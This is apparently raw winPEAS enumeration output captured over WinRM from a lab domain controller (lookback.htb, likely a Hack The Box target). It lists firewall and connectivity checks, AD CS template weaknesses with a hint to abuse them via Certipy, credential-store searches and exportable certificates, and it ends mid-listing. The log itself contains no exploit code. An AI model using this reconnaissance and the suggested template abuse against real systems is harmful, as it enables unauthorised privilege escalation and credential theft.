WINRM       172.16.55.128   5985   DC01               UDP        [fe80::c833:192d:dba0:737%4]                464           *:*                            652               lsass                               
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Firewall Rules
WINRM       172.16.55.128   5985   DC01             È Showing only DENY rules (too many ALLOW rules always)                                                                                                     
WINRM       172.16.55.128   5985   DC01                 Current Profiles: DOMAIN
WINRM       172.16.55.128   5985   DC01                 FirewallEnabled (Domain):    True
WINRM       172.16.55.128   5985   DC01                 FirewallEnabled (Private):    True
WINRM       172.16.55.128   5985   DC01                 FirewallEnabled (Public):    True
WINRM       172.16.55.128   5985   DC01                 DENY rules:
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ DNS cached --limit 70--
WINRM       172.16.55.128   5985   DC01                 Entry                                 Name                                  Data                                                                        
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Internet settings, zone and proxy configuration                                                                                    
WINRM       172.16.55.128   5985   DC01               General Settings
WINRM       172.16.55.128   5985   DC01               Hive        Key                                       Value                                                                                               
WINRM       172.16.55.128   5985   DC01               HKCU        CertificateRevocation                     1                                                                                                   
WINRM       172.16.55.128   5985   DC01               HKCU        DisableCachingOfSSLPages                  0                                                                                                   
WINRM       172.16.55.128   5985   DC01               HKCU        IE5_UA_Backup_Flag                        5.0                                                                                                 
WINRM       172.16.55.128   5985   DC01               HKCU        PrivacyAdvanced                           1                                                                                                   
WINRM       172.16.55.128   5985   DC01               HKCU        SecureProtocols                           10240                                                                                               
WINRM       172.16.55.128   5985   DC01               HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)                                                           
WINRM       172.16.55.128   5985   DC01               HKCU        ZonesSecurityUpgrade                      System.Byte[]                                                                                       
WINRM       172.16.55.128   5985   DC01               HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files                                                                 
WINRM       172.16.55.128   5985   DC01               HKLM        CodeBaseSearchPath                        CODEBASE                                                                                            
WINRM       172.16.55.128   5985   DC01               HKLM        EnablePunycode                            1                                                                                                   
WINRM       172.16.55.128   5985   DC01               HKLM        MinorVersion                              0                                                                                                   
WINRM       172.16.55.128   5985   DC01               HKLM        WarnOnIntranet                            1                                                                                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Zone Maps
WINRM       172.16.55.128   5985   DC01               No URLs configured
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Zone Auth Settings
WINRM       172.16.55.128   5985   DC01               No Zone Auth Settings
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Internet Connectivity
WINRM       172.16.55.128   5985   DC01             È Checking if internet access is possible via different methods                                                                                             
WINRM       172.16.55.128   5985   DC01                 HTTP (80) Access: Accessible
WINRM       172.16.55.128   5985   DC01                 HTTPS (443) Access: Not Accessible
WINRM       172.16.55.128   5985   DC01               [X] Exception:       Error: TCP connect timed out
WINRM       172.16.55.128   5985   DC01                 HTTPS (443) Access by Domain Name: Not Accessible                                                                                                       
WINRM       172.16.55.128   5985   DC01               [X] Exception:       Error: A task was canceled.
WINRM       172.16.55.128   5985   DC01                 DNS (53) Access: Accessible
WINRM       172.16.55.128   5985   DC01                 ICMP (ping) Access: Accessible
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Hostname Resolution
WINRM       172.16.55.128   5985   DC01             È Checking if the hostname can be resolved externally                                                                                                       
WINRM       172.16.55.128   5985   DC01               [X] Exception:     Error during hostname check: A task was canceled.                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Active Directory Quick Checks ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ gMSA readable managed passwords
WINRM       172.16.55.128   5985   DC01             È Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html                                                                                              
WINRM       172.16.55.128   5985   DC01               [-] No gMSA with readable managed password found (checked 0).                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ AD CS misconfigurations for ESC
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html                                                      
WINRM       172.16.55.128   5985   DC01             È Check for ADCS misconfigurations in the local DC registry                                                                                                 
WINRM       172.16.55.128   5985   DC01               StrongCertificateBindingEnforcement:  - Allow weak mapping if SID extension missing, may be vulnerable to ESC9.                                           
WINRM       172.16.55.128   5985   DC01               CertificateMappingMethods:  - Strong Certificate mapping enabled.                                                                                         
WINRM       172.16.55.128   5985   DC01               IF_ENFORCEENCRYPTICERTREQUEST set in InterfaceFlags - not vulnerable to ESC11.                                                                            
WINRM       172.16.55.128   5985   DC01               szOID_NTDS_CA_SECURITY_EXT not disabled for the CA - not vulnerable to ESC16.                                                                             
WINRM       172.16.55.128   5985   DC01             È 
WINRM       172.16.55.128   5985   DC01             If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4                                                                          
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: User  (Rights: WriteProperty,ExtendedRight)                                                                               
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: UserSignature  (Rights: WriteProperty,ExtendedRight)                                                                      
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: ClientAuth  (Rights: WriteProperty,ExtendedRight)                                                                         
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: EFS  (Rights: WriteProperty,ExtendedRight)                                                                                
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: login  (Rights: ExtendedRight)                                                                                            
WINRM       172.16.55.128   5985   DC01               Dangerous rights over template: IT-login  (Rights: ExtendedRight)                                                                                         
WINRM       172.16.55.128   5985   DC01               [*] Tip: Abuse with tools like Certipy (template write -> ESC1 -> enroll).                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Cloud Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                               
WINRM       172.16.55.128   5985   DC01             Learn and practice cloud hacking in training.hacktricks.xyz                                                                                                 
WINRM       172.16.55.128   5985   DC01             AWS EC2?                                No
WINRM       172.16.55.128   5985   DC01             Azure VM?                               No
WINRM       172.16.55.128   5985   DC01             Azure Tokens?                           No
WINRM       172.16.55.128   5985   DC01             Google Cloud Platform?                  No
WINRM       172.16.55.128   5985   DC01             Google Workspace Joined?                No
WINRM       172.16.55.128   5985   DC01             Google Cloud Directory Sync?            No
WINRM       172.16.55.128   5985   DC01             Google Password Sync?                   No
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Windows Credentials ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Windows Vault
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault                       
WINRM       172.16.55.128   5985   DC01               [ERROR] Unable to enumerate vaults. Error (0x1061)
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking Credential manager
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault                       
WINRM       172.16.55.128   5985   DC01                 [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated'                                                      
WINRM       172.16.55.128   5985   DC01             Please run:
WINRM       172.16.55.128   5985   DC01             cmdkey /list
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Saved RDP connections
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Remote Desktop Server/Client Settings
WINRM       172.16.55.128   5985   DC01               RDP Server Settings
WINRM       172.16.55.128   5985   DC01                 Network Level Authentication            :
WINRM       172.16.55.128   5985   DC01                 Block Clipboard Redirection             :
WINRM       172.16.55.128   5985   DC01                 Block COM Port Redirection              :
WINRM       172.16.55.128   5985   DC01                 Block Drive Redirection                 :
WINRM       172.16.55.128   5985   DC01                 Block LPT Port Redirection              :
WINRM       172.16.55.128   5985   DC01                 Block PnP Device Redirection            :
WINRM       172.16.55.128   5985   DC01                 Block Printer Redirection               :
WINRM       172.16.55.128   5985   DC01                 Allow Smart Card Redirection            :
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               RDP Client Settings
WINRM       172.16.55.128   5985   DC01                 Disable Password Saving                 :       True                                                                                                    
WINRM       172.16.55.128   5985   DC01                 Restricted Remote Administration        :       False                                                                                                   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Recently run commands
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi                                                    
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi                                                    
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for RDCMan Settings Files
WINRM       172.16.55.128   5985   DC01             È Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager                                                                         
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Kerberos tickets
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html                                                            
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for saved Wifi credentials
WINRM       172.16.55.128   5985   DC01               [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)                            
WINRM       172.16.55.128   5985   DC01             Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'                                                                                
WINRM       172.16.55.128   5985   DC01             No saved Wifi credentials found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking AppCmd.exe
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmdexe                                                
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking SSClient.exe
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient--sccm                                           
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating SSCM - System Center Configuration Manager settings                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Security Packages Credentials                                                                                                      
WINRM       172.16.55.128   5985   DC01               [X] Exception: Couldn't parse nt_resp. Len: 0 Message bytes: 4e544c4d5353500003000000010001006000000000000000610000000000000058000000000000005800000008000800580000000000000061000000058a80a20a007c4f0000000fec9029b388ebc309b00eccb201a4c1f3440043003000310000   
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Browsers Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                            
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Firefox
WINRM       172.16.55.128   5985   DC01                 Info: if no credentials were listed, you might need to close the browser and try again.                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Firefox DBs
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Firefox history                                                                                                 
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Chrome
WINRM       172.16.55.128   5985   DC01                 Info: if no credentials were listed, you might need to close the browser and try again.                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for Chrome DBs
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in Chrome history                                                                                                  
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Chrome bookmarks
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Opera
WINRM       172.16.55.128   5985   DC01                 Info: if no credentials were listed, you might need to close the browser and try again.                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Brave Browser                                                                                                    
WINRM       172.16.55.128   5985   DC01                 Info: if no credentials were listed, you might need to close the browser and try again.                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Showing saved credentials for Internet Explorer (unsupported)                                                                                  
WINRM       172.16.55.128   5985   DC01                 Info: if no credentials were listed, you might need to close the browser and try again.                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current IE tabs
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01               [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password.                                                                            
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                --- End of inner exception stack trace ---
WINRM       172.16.55.128   5985   DC01                at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)                                                                                    
WINRM       172.16.55.128   5985   DC01                at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)                                                        
WINRM       172.16.55.128   5985   DC01                at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()                                                                                   
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for GET credentials in IE history                                                                                                      
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history                                         
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ IE history -- limit 50
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 http://go.microsoft.com/fwlink/p/?LinkId=255141
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ IE favorites
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting files and registry ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty Sessions
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Putty SSH Host keys
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ SSH keys in registry
WINRM       172.16.55.128   5985   DC01             È If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry                                                              
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ SuperPutty configuration files
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Office 365 endpoints synced by OneDrive.                                                                                           
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-19
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-20
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-21-3830242231-3868280746-2763890440-1106                                                                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-21-3830242231-3868280746-2763890440-1112                                                                                                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775                                                                                    
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-18
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Cloud Credentials
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                           
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for common SAM & SYSTEM backups
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for McAfee Sitelist.xml Files
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Cached GPP Passwords
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible regs with creds
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry                                      
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for possible password files in users homes                                                                                             
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials                           
WINRM       172.16.55.128   5985   DC01                 C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml                                                                           
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching for Oracle SQL Developer config files                                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Slack files & directories
WINRM       172.16.55.128   5985   DC01               note: check manually if something is found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for LOL Binaries and Scripts (can be slow)                                                                                             
WINRM       172.16.55.128   5985   DC01             È  https://lolbas-project.github.io/
WINRM       172.16.55.128   5985   DC01                [!] Check skipped, if you want to run it, please specify '-lolbas' argument                                                                              
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Outlook download files
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files                                                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            :
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2026 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 97A1FC96F661B5E0E25802BEEB0856CA7EDE670C                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Template           : Template=Domain Controller Authentication(1.3.6.1.4.1.311.21.8.4679832.14812446.16206242.389827.4589012.184.1.28), Major Version Number=110, Minor Version Number=0                                                                          
WINRM       172.16.55.128   5985   DC01               Enhanced Key Usages
WINRM       172.16.55.128   5985   DC01                    Client Authentication     [*] Certificate is used for client authentication!                                                                         
WINRM       172.16.55.128   5985   DC01                    Server Authentication
WINRM       172.16.55.128   5985   DC01                    Smart Card Logon
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            : CN=dc01.lookback.htb
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:42:50 AM
WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2026 6:42:50 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 8D793805B6ADC17E2D7C86545C42BFDEF400BCDA                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Template           : DomainController
WINRM       172.16.55.128   5985   DC01               Enhanced Key Usages
WINRM       172.16.55.128   5985   DC01                    Client Authentication     [*] Certificate is used for client authentication!                                                                         
WINRM       172.16.55.128   5985   DC01                    Server Authentication
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            :
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               ExpiryDate         : 10/19/2026 6:44:52 AM
WINRM       172.16.55.128   5985   DC01               HasPrivateKey      : True
WINRM       172.16.55.128   5985   DC01               StoreLocation      : LocalMachine
WINRM       172.16.55.128   5985   DC01               KeyExportable      : True
WINRM       172.16.55.128   5985   DC01               Thumbprint         : 75B9E9D3B9837F6945A39582D2FC4B4D48A72815                                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Template           : Template=Directory Email Replication(1.3.6.1.4.1.311.21.8.4679832.14812446.16206242.389827.4589012.184.1.29), Major Version Number=115, Minor Version Number=0                                                                               
WINRM       172.16.55.128   5985   DC01               Enhanced Key Usages
WINRM       172.16.55.128   5985   DC01                    Directory Service Email Replication
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Issuer             : CN=lookback-DC01-CA, DC=lookback, DC=htb                                                                                             
WINRM       172.16.55.128   5985   DC01               Subject            : CN=dc01.lookback.htb
WINRM       172.16.55.128   5985   DC01               ValidDate          : 10/19/2025 6:44:52 AM
